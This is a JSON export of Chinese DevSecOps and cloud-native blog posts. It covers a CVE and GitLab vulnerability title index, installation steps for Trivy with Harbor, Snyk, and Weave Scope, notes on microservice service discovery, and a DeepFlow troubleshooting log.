3.0\n影响资产数\n影响面\n\n\n\nCVE-2021-21685\n9.1\n9582\n92.7%\n\n\nCVE-2021-21686\n8.1\n9582\n92.7%\n\n\nCVE-2021-21687\n9.1\n9582\n92.7%\n\n\nCVE-2021-21688\n7.5\n9582\n92.7%\n\n\nCVE-2021-21689\n9.1\n9582\n92.7%\n\n\nCVE-2021-21690\n9.8\n9582\n92.7%\n\n\nCVE-2021-21691\n9.8\n9582\n92.7%\n\n\nCVE-2021-21692\n9.8\n9582\n92.7%\n\n\nCVE-2021-21693\n9.8\n9582\n92.7%\n\n\nCVE-2021-21694\n9.8\n9582\n92.7%\n\n\nCVE-2021-21695\n8.8\n9582\n92.7%\n\n\nCVE-2021-21696\n9.8\n9582\n92.7%\n\n\nCVE-2021-21697\n9.1\n9582\n92.7%\n\n\nCVE-2021-21671\n7.5\n8576\n83%\n\n\nCVE-2021-21604\n8.0\n5666\n54.8%\n\n\nCVE-2021-21605\n8.0\n5666\n54.8%\n\n\nCVE-2020-2160\n8.8\n2953\n28.6%\n\n\nCVE-2020-2099\n8.6\n2283\n22.1%\n\n\ngitlab一.issue相关的gitlab漏洞系列-guest用户越权创建新的测试用例\ngitlab漏洞系列-越权访问内部  \ngtilab漏洞系列-公共项目中被移除的reporter仍然可以修改敏感报告  \ngitlab漏洞系列-由markdown所导致的权限问题  \n二.group相关的gitlab漏洞系列-越权访问内部\ngitlab漏洞系列-guest用户越权更改事件严重性\ngitlab漏洞系列-绕过ip限制查看组项目\ngitlab漏洞系列-团队成员可以提升他们维护所导入项目的权限  \ngitlab漏洞系列-试用许可证越权可以在gitlab.com上创建项目访问令牌  \ngitlab漏洞系列-文件模板项目ID泄露  \ngitlab漏洞系列-利用2FA机制可以屏蔽用户  \ngitlab漏洞系列-Create groups功能中存在存储型xss  \ngitlab漏洞系列-子组的开发人员可以越权访问主私有组  \ngitlab漏洞-越权添加具有不同域名电子邮件地址的成员  \ngitlab漏洞系列-group路径泄露  \ngitlab漏洞系列-试用许可证越权可以在gitlab.com上创建项目访问令牌  \n三.合并请求相关的(分支相关)gitlab漏洞系列-合并请求信息泄露\ngitlab漏洞系列-Guest用户越权重新评论\ngitlab漏洞系列-使用未经验证的电子邮件地址绕过Require Code Owner approval机制  \ngitlab漏洞系列-越权下载文件  \ngitlab漏洞系列-新仓库中可以切换至与受保护分支同名的Tag以替换原分支  \ngitlab漏洞系列-越权获取合并事件的个数\ngitlab漏洞系列-私有项目分支名称泄露\ngitlab漏洞系列-“外部状态检查”API泄漏关于实例的状态检查的数据  \n四.电子邮箱相关的gitlab漏洞系列-使用未经验证的电子邮件地址绕过Require Code Owner approval机制\ngitlab在漏洞系列-越权查看成员信息\ngitlab漏洞-越权添加具有不同域名电子邮件地址的成员  \ngitlab漏洞-Oauth Web应用漏洞  \ngitlab漏洞系列-越权验证任何邮箱  \ngitlab漏洞系列-用户邮件从过期的令牌中泄露  \n五.使用api来访问的gitlab漏洞系列-越权访问内部\ngitlab漏洞系列-合并请求信息泄露\ngitlab漏洞-未经授权的用户可以访问管道数据\ngitlab漏洞系列-guest用户越权创建新的测试用例\ngitlab漏洞系列-绕过Disabled Repo机制  \ngitlab漏洞系列-guest用户越权看到标签名称  \ngitlab漏洞系列-越权更改项目可见性  \ngitlab漏洞-未经授权的用户可以访问管道数据  \ngitlab漏洞系列-存储型XSS所导致的管理员权限升级  \ngitlab漏洞系列-“外部状态检查”API泄漏关于实例的状态检查的数据  \n六.管道相关的(与ci&#x2F;cd业务相关的)gitlab漏洞-未经授权的用户可以访问管道数据\ngitlab漏洞系列-未授权用户可能触发部署到受保护环境  \ngitlab漏洞-未经授权的用户可以访问管道数据  \ngitlab漏洞系列-绕过CI&#x2F;CD给定配额限制  \n七.认证机制相关(2FA)gitlab漏洞系列-Gitlab Pages Auth Bypass  \ngitlab漏洞系列-2FA被重复利用  \ngitlab漏洞系列-NPM注册表接受OAuth2令牌  \ngitlab漏洞系列-未经授权访问wiki  \ngitlab漏洞系列-利用2FA机制可以屏蔽用户  \ngitlab漏洞系列-/profile/applications没有2FA机制导致权限升级  \n八.项目基本设置功能gitlab漏洞系列-项目设置中UI逻辑漏洞导致项目数据泄露  \ngitlab漏洞系列-项目组成员越权收到邀请  \ngitlab漏洞系列-越权设置日期  \ngitlab漏洞系列-未经授权的用户可以解锁项目的锁定文件  \ngitlab漏洞系列-绕过接受条款删除自己的帐户  \ngitlab漏洞系列-任何用户在授权后都可以检索OAuth应用程序客户端敏感信息  \ngitlab漏洞系列-越权查看用户私有信息  \ngitlab漏洞系列-越权获取任何项目的特性标志用户列表(包括用户id)  \ngitlab-用户越权回复漏洞报告  \n九.与本地实例相关的gitlab漏洞系列-安装Gitlab runner与Docker-In-Docker允许root权限  \ngitlab漏洞系列-由外部授权所导致的blind SSRF\ngitlab漏洞系列-用户越权访问内部项目\n十.其他gitlab漏洞系列-用户泄露Gitlab敏感信息  \ngitlab漏洞系列-GitHub令牌泄露\nConfluence[[Atlassian Confluence OGNL表达式任意执行漏洞（CVE-2022-26134）]][[Atlassian Confluence远程代码执行漏洞漏洞（CVE-2019-3396）]][[Atlassian Jira Seraph 认证绕过远程代码执行漏洞（CVE-2022-0540）]]\n📚参考SAST 测试中要测量的三个参数You can’t compare SAST tools using only lists, test suites, and benchmarks | SnykIAST | 洞态文档GitLab Critical Security Release: 15.1.1, 15.0.4, and 14.10.5 | GitLabDevOps风险测绘之代码篇gitlabGitlab常见漏洞复现及后利用 - 先知社区\n","slug":"Devsecops工具链","date":"2022-02-08T02:58:04.000Z","categories_index":"DevSecOps","tags_index":"DevSecOps工具链,CI/CD,工具链风险","author_index":"Moses"},{"id":"f80e788fa76fb3d65b76873268419752","title":"容器安全平台-Trivy","content":"介绍Trivy是一款简单而全面的扫描仪，用于处理容器映像、文件系统和Git存储库中的漏洞以及配置问题。Trivy检测操作系统包（Alpine、RHEL、CentOS等）和特定语言包（Bundler、Composer、npm、yarn等）的漏洞。此外，Trivy将基础设施扫描为代码（IaC）文件，如Terraform、Dockerfile和Kubernetes，以检测使您的部署面临攻击风险的潜在配置问题。Trivy易于使用.trivy已经成了harbor v.2.2.1的默认安全扫描插件\ntrivy目前分为安装版和habor集成版\n功能对比\n安装部署集成版架构\nhelm安装Harbor&gt;&#x3D;2.0版本Trivy已默认集成。harbor chart&gt;&#x3D;1.4可以使用官方Helm安装\nhelm repo add harbor https:&#x2F;&#x2F;helm.goharbor.io\nhelm install harbor harbor&#x2F;harbor \\\n  --create-namespace \\\n  --namespace harbor \\\n  --set clair.enabled&#x3D;false \\\n  --set trivy.enabled&#x3D;true\nHarbor 1.10 on Kubernetes\nhelm repo add aqua https:&#x2F;&#x2F;aquasecurity.github.io&#x2F;helm-charts\nhelm install harbor-scanner-trivy aqua&#x2F;harbor-scanner-trivy \\\n  --namespace harbor --create-namespace\nRHEL&#x2F;CentOS手动部署安装docker\n  cd &#x2F;etc&#x2F;yum.repos.d&#x2F;  \n  wget http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;centos&#x2F;docker-ce.repo  \n  yum makecache  \n  yum install docker-ce  -y  &amp;&amp; systemctl start docker &amp;&amp; systemctl enable docker  \n  \n  \n  vim &#x2F;etc&#x2F;docker&#x2F;daemon.json  \n  \n&#123;  \n&quot;exec-opts&quot;: [&quot;native.cgroupdriver&#x3D;systemd&quot;],    \n&quot;registry-mirrors&quot;: [&quot;https:&#x2F;&#x2F;docker.mirrors.ustc.edu.cn&quot;]  \n&#125;  \n  \n systemctl  restart  docker\n安装docker-compose\ncurl -L &quot;https:&#x2F;&#x2F;github.com&#x2F;docker&#x2F;compose&#x2F;releases&#x2F;download&#x2F;1.23.2&#x2F;docker-compose-$(uname -s)-$(uname -m)&quot; -o &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose  \n\nchmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose\n下载harbor\nwget  https:&#x2F;&#x2F;github.com&#x2F;goharbor&#x2F;harbor&#x2F;releases&#x2F;download&#x2F;v2.2.3&#x2F;harbor-offline-installer-v2.2.3.tgz\n修改 harbor.yml配置文件，生产环境请用https，这里仅用于测试\ntar xf harbor-offline-installer-v2.2.3.tgz   \ncp harbor.yml.tmpl harbor.yml  \n  \n.&#x2F;prepare   \n.&#x2F;install.sh  --with-trivy  --with-chartmuseum\nVmware Harbor 提供了一个API 接口，这样我们就可以与SOC 集成，查看images 的安全情况。\n&#x2F;projects&#x2F;&#123;project_name&#125;&#x2F;repositories&#x2F;&#123;repository_name&#125;&#x2F;artifacts&#x2F;&#123;reference&#125;&#x2F;additions&#x2F;vulnerabilities    \n  \n  \ncurl -X GET &quot;http:&#x2F;&#x2F;172.16.116.5&#x2F;api&#x2F;v2.0&#x2F;projects&#x2F;library&#x2F;repositories&#x2F;fastjson&#x2F;artifacts&#x2F;1.2.24&#x2F;additions&#x2F;vulnerabilities&quot; -H &quot;accept: application&#x2F;json&quot; -H &quot;X-Request-Id: 111&quot;\n安装版RHEL&#x2F;CentOS#添加源\n$ sudo vim &#x2F;etc&#x2F;yum.repos.d&#x2F;trivy.repo [trivy] name&#x3D;Trivy repository baseurl&#x3D;https:&#x2F;&#x2F;aquasecurity.github.io&#x2F;trivy-repo&#x2F;rpm&#x2F;releases&#x2F;$releasever&#x2F;$basearch&#x2F; gpgcheck&#x3D;0 enabled&#x3D;1 $ sudo yum -y update $ sudo yum -y install trivy\nRPMrpm -ivh https:&#x2F;&#x2F;github.com&#x2F;aquasecurity&#x2F;trivy&#x2F;releases&#x2F;download&#x2F;v0.22.0&#x2F;trivy_0.22.0_Linux-64bit.rpm\ndockerdocker pull aquasec&#x2F;harbor-scanner-trivy:0.25.0\n\ndocker run --rm -v [YOUR_CACHE_DIR]:&#x2F;root&#x2F;.cache&#x2F; aquasec&#x2F;trivy:0.25.0 [YOUR_IMAGE_NAME]\n\n#部署Redis\n$docker run --name redis -d --rm redis:5\n#部署trivy-adapter\ndocker run --name trivy-adapter -d --rm \\\n  -p 8181:8181 \\\n adapter,core,redis&#39; \\\n  -e &quot;SCANNER_LOG_LEVEL&#x3D;trace&quot; \\\n  -e &quot;SCANNER_TRIVY_DEBUG_MODE&#x3D;true&quot; \\\n  -e &quot;TRIVY_NON_SSL&#x3D;true&quot; \\\n  -e &quot;SCANNER_API_SERVER_ADDR&#x3D;:8181&quot; \\\n  -e &quot;SCANNER_STORE_REDIS_URL&#x3D;redis:&#x2F;&#x2F;redis:6379&quot; \\\n  -e &quot;SCANNER_JOB_QUEUE_REDIS_URL&#x3D;redis:&#x2F;&#x2F;redis:6379&quot; \\\n  --network harbor_harbor \\\n  aquasec&#x2F;harbor-scanner-trivy:0.25.0\n\n\n参数列表：\n\n\n\nName\nDefault\nDescription\n\n\n\nSCANNER_LOG_LEVEL\ninfo\nThe log level of trace, debug, info, warn, warning, error, fatal or panic. The standard logger logs entries with that level or anything above it.\n\n\nSCANNER_API_SERVER_ADDR\n:8080\nBinding address for the API server\n\n\nSCANNER_API_SERVER_TLS_CERTIFICATE\nN&#x2F;A\nThe absolute path to the x509 certificate file\n\n\nSCANNER_API_SERVER_TLS_KEY\nN&#x2F;A\nThe absolute path to the x509 private key file\n\n\nSCANNER_API_SERVER_CLIENT_CAS\nN&#x2F;A\nA list of absolute paths to x509 root certificate authorities that the api use if required to verify a client certificate\n\n\nSCANNER_API_SERVER_READ_TIMEOUT\n15s\nThe maximum duration for reading the entire request, including the body\n\n\nSCANNER_API_SERVER_WRITE_TIMEOUT\n15s\nThe maximum duration before timing out writes of the response\n\n\nSCANNER_API_SERVER_IDLE_TIMEOUT\n60s\nThe maximum amount of time to wait for the next request when keep-alives are enabled\n\n\nSCANNER_TRIVY_CACHE_DIR\n&#x2F;home&#x2F;scanner&#x2F;.cache&#x2F;trivy\nTrivy cache directory\n\n\nSCANNER_TRIVY_REPORTS_DIR\n&#x2F;home&#x2F;scanner&#x2F;.cache&#x2F;reports\nTrivy reports directory\n\n\nSCANNER_TRIVY_DEBUG_MODE\nfalse\nThe flag to enable or disable Trivy debug mode\n\n\nSCANNER_TRIVY_VULN_TYPE\nos,library\nComma-separated list of vulnerability types. Possible values are os and library.\n\n\nSCANNER_TRIVY_SEVERITY\nUNKNOWN,LOW,MEDIUM,HIGH,CRITICAL\nComma-separated list of vulnerabilities severities to be displayed\n\n\nSCANNER_TRIVY_IGNORE_UNFIXED\nfalse\nThe flag to display only fixed vulnerabilities\n\n\nSCANNER_TRIVY_IGNORE_POLICY\n\nThe path for the Trivy ignore policy OPA Rego file\n\n\nSCANNER_TRIVY_SKIP_UPDATE\nfalse\nThe flag to disable Trivy DB downloads.\n\n\nSCANNER_TRIVY_OFFLINE_SCAN\nfalse\nThe flag to disable external API requests to identify dependencies.\n\n\nSCANNER_TRIVY_GITHUB_TOKEN\nN&#x2F;A\nThe GitHub access token to download Trivy DB (see GitHub rate limiting)\n\n\nSCANNER_TRIVY_INSECURE\nfalse\nThe flag to skip verifying registry certificate\n\n\nSCANNER_TRIVY_TIMEOUT\n5m0s\nThe duration to wait for scan completion\n\n\nSCANNER_STORE_REDIS_NAMESPACE\nharbor.scanner.trivy:store\nThe namespace for keys in the Redis store\n\n\nSCANNER_STORE_REDIS_SCAN_JOB_TTL\n1h\nThe time to live for persisting scan jobs and associated scan reports\n\n\nSCANNER_JOB_QUEUE_REDIS_NAMESPACE\nharbor.scanner.trivy:job-queue\nThe namespace for keys in the scan jobs queue backed by Redis\n\n\nSCANNER_JOB_QUEUE_WORKER_CONCURRENCY\n1\nThe number of workers to spin-up for the scan jobs queue\n\n\nSCANNER_REDIS_URL\nredis:&#x2F;&#x2F;harbor-harbor-redis:6379\nThe Redis server URI. The URI supports schemas to connect to a standalone Redis server, i.e. redis:&#x2F;&#x2F;:password@standalone_host:port&#x2F;db-number and Redis Sentinel deployment, i.e. redis+sentinel:&#x2F;&#x2F;:password@sentinel_host1:port1,sentinel_host2:port2&#x2F;monitor-name&#x2F;db-number.\n\n\nSCANNER_REDIS_POOL_MAX_ACTIVE\n5\nThe max number of connections allocated by the Redis connection pool\n\n\nSCANNER_REDIS_POOL_MAX_IDLE\n5\nThe max number of idle connections in the Redis connection pool\n\n\nSCANNER_REDIS_POOL_IDLE_TIMEOUT\n5m\nThe duration after which idle connections to the Redis server are closed. If the value is zero, then idle connections are not closed.\n\n\nSCANNER_REDIS_POOL_CONNECTION_TIMEOUT\n1s\nThe timeout for connecting to the Redis server\n\n\nSCANNER_REDIS_POOL_READ_TIMEOUT\n1s\nThe timeout for reading a single Redis command reply\n\n\nSCANNER_REDIS_POOL_WRITE_TIMEOUT\n1s\nThe timeout for writing a single Redis command.\n\n\nHTTP_PROXY\nN&#x2F;A\nThe URL of the HTTP proxy server\n\n\nHTTPS_PROXY\nN&#x2F;A\nThe URL of the HTTPS proxy server\n\n\nNO_PROXY\nN&#x2F;A\nThe URLs that the proxy settings do not apply to\n\n\n参考链接https://aquasecurity.github.io/trivy/v0.22.0/getting-started/overview/\n","slug":"容器镜像安全-trivy","date":"2022-01-28T08:06:10.000Z","categories_index":"Cloud-Native-Security","tags_index":"云原生安全,容器安全平台,产品选型,Trivy","author_index":"Moses"},{"id":"7635de4b7a3e17088e6fc5a823d4941c","title":"软件供应链安全分析工具-snyk","content":"使用snyk检查开源软件依赖中的漏洞.md0x01简介Snyk 是一家美国的安全公司，致力于监控开源软件包中的漏洞。Snyk 以其庞大的漏洞资料库为基础（由以色列和伦敦的资安研究专家团队负责维护该资料库），持续的监控开源社区中各种软件包的安全情况，以及给出解决方案。 随著 Snyk 的不断发展，它已经可以做到轻鬆扫描，IDE配合，与原码平台整合 (如 GitHub、BitBucket、GitLab等)、实现 CI&#x2F;CD 流程。\nSnyk 虽然是一款商用漏洞扫描工具，但他对开源的项目免费。私有的项目，也可以用每月 200 次的扫描。\n0x02架构图\n0x03核心能力\nJavascript\nJava\nPython\nPhp\nRuby\nGolang\nScala\nSwift &amp; Objectiv-C\n.NET\n\n0x04对比npm-audit VS snyk\n0x05Quickstartnpm install -g snyk\nrequireTo create a Snyk account\ninstall[[mac]]\nbrew tap snyk&#x2F;tap  \nbrew install snyk\n[[Authenticate]] your machine\nsnyk auth\n[[Navigate]] into your code’s directory and run\nsnyk monitor\n\ncheck1.IDEA和CLI\n2.dashboard\n进阶Snyk CI&#x2F;CD Integration: good practicesScan your Dockerfile0x06使用说明CI&#x2F;DIContrainAPI \n0x07应用场景References官方文档\n","slug":"使用snyk检查开源软件依赖中的漏洞.md","date":"2021-12-31T08:35:00.000Z","categories_index":"软件供应链安全","tags_index":"SCA,软件供应链安全分析工具,snyk","author_index":"Moses"},{"id":"ffb8302384d7f037a2dd91b7ad370f37","title":"Kubernetes学习笔记 -- weavescope","content":"介绍Weave Scope是Docker和Kubernetes的可视化和监视工具。它提供了自上而下的应用程序视图以及整个基础架构视图，并允许您实时诊断将分布式容器化应用程序部署到云提供商时遇到的任何问题。WeaveScope 监控展示了主机、容器、进程的众多常用数据和状态，并提供 WebUI和plugin插件。\n特点\n直观的图形或表格模式；\n灵活的过滤和强大的搜索；\n实时展示应用和容器指标；\n支持多主机监管，支持k8s。\n\n安装部署k8s集群部署声明文件添加basicAuth未成功，推荐1容器部署可以实现身份认证。\n1.容器部署# 下载 scope 工具\nsudo curl -L https:&#x2F;&#x2F;github.com&#x2F;weaveworks&#x2F;scope&#x2F;releases&#x2F;download&#x2F;latest_release&#x2F;scope -o &#x2F;usr&#x2F;local&#x2F;bin&#x2F;scope\n# 使 scope 具有执行权限\nsudo chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;scope\n# 部署安装 Weave Scope， 并设定验证用户 myuser， 密码 mypassword。\nsudo scope launch -app.basicAuth -app.basicAuth.password mypassword -app.basicAuth.username myuser -probe.basicAuth -probe.basicAuth.password mypassword -probe.basicAuth.username myuser\n2.helm部署1、搜索weave仓库\n[root@k8s01 scope]# helm search repo weave\nNAME                    CHART VERSION   APP VERSION DESCRIPTION\nali&#x2F;weave-cloud         0.1.2                       Weave Cloud is a add-on to Kubernetes which pro...\nali&#x2F;weave-scope         0.9.2           1.6.5       A Helm chart for the Weave Scope cluster visual...\naliyun&#x2F;weave-cloud      0.1.2                       Weave Cloud is a add-on to Kubernetes which pro...\naliyun&#x2F;weave-scope      0.9.2           1.6.5       A Helm chart for the Weave Scope cluster visual...\napphub&#x2F;weave-cloud      0.3.7           1.4.0       Weave Cloud is a add-on to Kubernetes which pro...\napphub&#x2F;weave-scope      1.1.8           1.12.0      A Helm chart for the Weave Scope cluster visual...\nburdenbear&#x2F;weave-cloud  0.3.8           1.4.0       Weave Cloud is a add-on to Kubernetes which pro...\nburdenbear&#x2F;weave-scope  1.1.11          1.12.0      A Helm chart for the Weave Scope cluster visual...\nchart&#x2F;weave-cloud       0.3.3           1.3.0       Weave Cloud is a add-on to Kubernetes which pro...\nchart&#x2F;weave-scope       1.1.1           1.11.1      A Helm chart for the Weave Scope cluster visual...\nstable&#x2F;weave-cloud      0.3.8           1.4.0       Weave Cloud is a add-on to Kubernetes which pro...\nstable&#x2F;weave-scope      1.1.11          1.12.0      A Helm chart for the Weave Scope cluster visual...\n2、下载远程安装包到本地并解压\nhelm fetch stable&#x2F;weave-scope [[helm]] pull\ntar xf weave-scope-1.1.10.tgz\n3、修改ClusterIP为NodePort\n[root@k8s01 data]# sed -i &quot;s@\\ type:\\ \\&quot;ClusterIP\\&quot;@ type: \\&quot;NodePort\\&quot;@&quot; weave-scope&#x2F;values.yaml\n4、创建weave-scope命名空间\n[root@k8s01 data]# kubectl create namespace weave-scope\n5.安装\n[root@k8s01 data]# helm install -n weave-scope common-service -f weave-scope&#x2F;values.yaml weave-scope&#x2F;\n6.验证服务列表\n[root@k8s01 data]# helm list -n weave-scope\n7.验证服务状态\nhelm status common-service -n weave-scope\n8.验证pod svc deploy\n[root@k8s01 data]# kubectl get all -n weave-scope -o wide\n3.k8s安装\nkubectl apply -f &quot;https:&#x2F;&#x2F;cloud.weave.works&#x2F;k8s&#x2F;scope.yaml?k8s-version&#x3D;$(kubectl version | base64 | tr -d &#39;\\n&#39;)&quot;\nkubectl get pod -n weave\nkubectl get svc -n weave\nkubectl get deploy -n weave\nkubectl port-forward --address&#x3D;X.X.X.X -n weave &quot;$(kubectl get -n weave pod --selector&#x3D;weave-scope-component&#x3D;app -o jsonpath&#x3D;&#39;&#123;.items..metadata.name&#125;&#39;)&quot; 4040\n项目地址githubweave docs \n","slug":"WeaveScope","date":"2021-09-28T16:00:00.000Z","categories_index":"Cloud-Native","tags_index":"Kubernetes,k8s-dashboard,weave,CNI","author_index":"Moses"},{"id":"d1f13540bd8121bde49915d55687c3f7","title":"微服务学习-服务发现","content":"一、什么是服务发现？让用户不用关心服务提供者的具体网络位置（IP、端口等）和配置步骤，只需要选择和链接即可使用这些服务。如局域网内 通过WS-Discovery或者Bonjor协议发现并连接网络打印机服务，亦或是华为鸿蒙超级终端通过蓝牙、WIFI等通信技术[软总线技术] ，可以实现发现并使用其他设备\n二、为什么是服务发现？随着应用架构从单体式应用-SOA-微服务的演进，应用的拆分、服务间解耦和服务动态扩展带来的服务迁移、服务治理等需求促使服务发现机制的产生。\n三、微服务中的服务发现客户端发现：  \n\n1.服务提供者的实例在启动时或者位置信息发生变化时会向服务注册表注册自身，在停止时会向服务注册表注销自身，如果服务提供者的实例发生故障，在一段时间内不发送心跳之后，也会被服务注册表注销。     \n2.服务消费者的实例会向服务注册表查询服务提供者的位置信息，然后通过这些位置信息直接向服务提供者发起请求。\n\n服务端发现：    \n\n第一步与客户端发现相同。  \n服务消费者不直接向服务注册表查询，也不直接向服务提供者发起请求，而是将对服务提供者的请求发往一个中央路由器或者负载均衡器，中央路由器或者负载均衡器查询服务注册表获取服务提供者的位置信息，并将请求转发给服务提供者。\n\n\n这两种架构都各有利弊，以客户端服务发现软件Eureka和服务端服务发现架构Kubernetes/SkyDNS+Ingress LB+Traefik+PowerDNS为例说明。   \n\n\n\n服务发现方案\nPros\nCons\n\n\n\nEureka\n使用简单，适用于java语言开发的项目，比服务端服务发现少一次网络跳转\n对非Java语言的支持不够好，Consumer需要内置特定的服务发现客户端和发现逻辑\n\n\nKubernetes\nConsumer无需关注服务发现具体细节，只需知道服务的DNS域名即可，支持异构语言开发\n需要基础设施支撑，多了一次网络跳转，可能有性能损失\n\n\nEurkaEureka 和 Spring Boot、Spring Cloud 都整合的非常好，所以使用起来非常简单，只需在 pom 中加入对 Spring Cloud Eureka Server 的依赖并在代码中加入 @EnableEurekaServer，即可创建一个 Eureka Server，在服务提供者和消费者这边，只需在 pom 中加入对 Spring Cloud Eureka 的依赖并在代码中加入 @EnableDiscoveryClient，代码运行时即可自动将自身注册到 Eureka Server 中，然后使用 getInstances 方法即可查询服务实例的位置信息，这个时候还可以使用客户端负载均衡方案 Netflix Ribbon 对这些实例做负载均衡。    \nRibbon提供一组丰富的功能集：多种内建的负载均衡规则：   \n\nRound-robin 轮询负载均衡    \n平均加权响应时间负载均衡  \n随机负载均衡    \n可用性过滤负载均衡（避免跳闸线路和高并发链接数）*自定义负载均衡插件系统*与服务发现解决方案的可拔插集成（包括Eureka）*云原生智能，例如可用区亲和性和不健康区规避*内建的故障恢复能力\n\nconsul略\nzookeeper见zookeeper\n","slug":"服务发现","date":"2021-09-26T04:23:21.000Z","categories_index":"分布式,微服务","tags_index":"服务发现 - 微服务","author_index":"Moses"},{"id":"880573b75c369c317bbd9d9133cf8195","title":"DeepFlow安装","content":"install Q&amp;A关于IPV4还是IPV6的问题\n\n\n\n\n\n\n\n\n单个k8s集群（v1.22.10）通过helm（v3.9.0）部署deepflow，使用value文件指定默认SC，3个PVC状态均正常。问题：server、mysql、grafana、app4个pod均异常。\n\n\n查看日志，默认使用IPV6协议栈。my.cnf初始配置\n[client]\ndefault-character-set&#x3D;utf8\n\n[mysqld]\ndefault-authentication-plugin&#x3D;mysql_native_password\n\n# Network related\nbind-address&#x3D;::\nport&#x3D;30130\n\n# Enable query cache\ninnodb_buffer_pool_size&#x3D;20M\nmax_connections&#x3D;1000\nwait_timeout&#x3D;60\n\n# Replication related\nslave_skip_errors&#x3D;all\n修改为IPV4协议栈后，出app意外其余部署没有问题。查看app容器日志\n2022-08-23 11:38:15,403 T140463419844416-MainThread INFO app.main.42: Launching Deepflow-app ...\nTraceback (most recent call last):\n  File &quot;&#x2F;root&#x2F;app&#x2F;app.py&quot;, line 56, in &lt;module&gt;\n    main()\n  File &quot;&#x2F;root&#x2F;app&#x2F;app.py&quot;, line 48, in main\n    sock &#x3D; socket.socket(socket.AF_INET6, socket.SOCK_STREAM)\n  File &quot;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;socket.py&quot;, line 231, in __init__\n    _socket.socket.__init__(self, family, type, proto, fileno)\nOSError: [Errno 97] Address family not supported by protocol\n\n\n\n\n\n\n\n\n\n联系厂商后，推送支持ipv4的app镜像，问题解决\n\n期间宿主机启用IPV6协议，见[[k8s启用IPV4&amp;IPV6双栈实践|k8s ipv4&#x2F;ipv6双栈实践]]\n\ndelete app容器重新拉取新的镜像和使用IPV6协议配置以上两种方式测试后均没有问题，所有容器运营正常，没有新的报错。\n\n\ngrafana 视图查看问题\n从报错来看，开始以为是后端服务问题，查看相关日志未发现。遂排查插件问题，内置插件未签名，导致Safari浏览器打开有问题，切换Chrome浏览器后问题解决。\n\n\n\n\n\n\n\n\n\n经排查发现是前端问题，以通知厂商。厂商确认后修改grafana镜像至latest tag\nclickhouse的存储问题helm安装在K8S集群内的clickhouse1天的磁盘占用率约占50%左右，大概24G的数据量。\nroot@deepflow-clickhouse-0:&#x2F;# df -h\nFilesystem           Size  Used Avail Use% Mounted on\noverlay               47G   24G   24G  50% &#x2F;\ntmpfs                 64M     0   64M   0% &#x2F;dev\ntmpfs                7.9G     0  7.9G   0% &#x2F;sys&#x2F;fs&#x2F;cgroup\n&#x2F;dev&#x2F;mapper&#x2F;cl-root   47G   24G   24G  50% &#x2F;etc&#x2F;hosts\nshm                   64M     0   64M   0% &#x2F;dev&#x2F;shm\ntmpfs                 15G   12K   15G   1% &#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;serviceaccount\ntmpfs                7.9G     0  7.9G   0% &#x2F;proc&#x2F;acpi\ntmpfs                7.9G     0  7.9G   0% &#x2F;proc&#x2F;scsi\ntmpfs                7.9G     0  7.9G   0% &#x2F;sys&#x2F;firmware\nroot@deepflow-clickhouse-0:&#x2F;# cd &#x2F;var&#x2F;lib&#x2F;clickhouse\nroot@deepflow-clickhouse-0:&#x2F;var&#x2F;lib&#x2F;clickhouse# df -h .\nFilesystem           Size  Used Avail Use% Mounted on\n&#x2F;dev&#x2F;mapper&#x2F;cl-root   47G   24G   24G  50% &#x2F;var&#x2F;lib&#x2F;clickhouse\n\n解决方案\n新版本DeepFlow 6.1.2，将会支持使用外部Clickhouse。\n设置设置采集频率- server 端采样（配置server的configmap即可）：https:&#x2F;&#x2F;github.com&#x2F;deepflowys&#x2F;deepflow&#x2F;blob&#x2F;main&#x2F;server&#x2F;server.yaml#L345\n\n- agent 端采样：\ndeepflow-ctl agent-group-config example | grep log_coll -B 2\n配置方法：https:&#x2F;&#x2F;deepflow.yunshan.net:7788&#x2F;docs&#x2F;zh&#x2F;install&#x2F;advanced-config&#x2F;#deepflow-agent\n设置数据保留期限？暂时不支持\n\n关于nodelocalDNS设置Ipv6的问题查看nodelocalDNS日志，错误信息：\n2022&#x2F;08&#x2F;23 07:41:41 [ERROR] Failed to sync kube-dns config directory &#x2F;etc&#x2F;kube-dns, err: lstat &#x2F;etc&#x2F;kube-dns: no such file or directory  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;raw PREROUTING [-p tcp -d 169.254.25.10 --dport 53 -j NOTRACK]&#125;  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;raw PREROUTING [-p udp -d 169.254.25.10 --dport 53 -j NOTRACK]&#125;  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;filter INPUT [-p tcp -d 169.254.25.10 --dport 53 -j ACCEPT]&#125;  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;filter INPUT [-p udp -d 169.254.25.10 --dport 53 -j ACCEPT]&#125;  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;raw OUTPUT [-p tcp -s 169.254.25.10 --sport 53 -j NOTRACK]&#125;  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;raw OUTPUT [-p udp -s 169.254.25.10 --sport 53 -j NOTRACK]&#125;  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;filter OUTPUT [-p tcp -s 169.254.25.10 --sport 53 -j ACCEPT]&#125;  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;filter OUTPUT [-p udp -s 169.254.25.10 --sport 53 -j ACCEPT]&#125;  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;raw OUTPUT [-p tcp -d 169.254.25.10 --dport 53 -j NOTRACK]&#125;  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;raw OUTPUT [-p udp -d 169.254.25.10 --dport 53 -j NOTRACK]&#125;  \n\n2022&#x2F;08&#x2F;23 07:41:41 [INFO] Added back nodelocaldns rule - &#123;raw OUTPUT [-p tcp -d 169.254.25.10 --dport 8080 